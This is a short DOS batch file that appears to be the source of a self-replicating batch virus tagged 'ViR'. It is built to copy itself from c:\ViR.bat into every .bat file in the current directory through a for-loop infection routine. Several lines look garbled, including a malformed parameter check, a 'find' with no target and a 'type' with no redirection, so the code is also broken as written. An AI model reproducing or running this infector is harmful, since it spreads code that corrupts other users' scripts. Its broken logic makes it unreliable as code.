@echo off 
if '5=='InF goto ViR_inf
if exist c:\vir.bat goto ViR_run
if not exist make.bat goto ViR_end
find "ViR"  
:ViR_run
for %a in (*.bat) do call c:\ViR InF %a
goto ViR_end
:ViR_inf    
if not errorlevel 1 goto ViR_end
type c:\ViR.bat 
:ViR_end
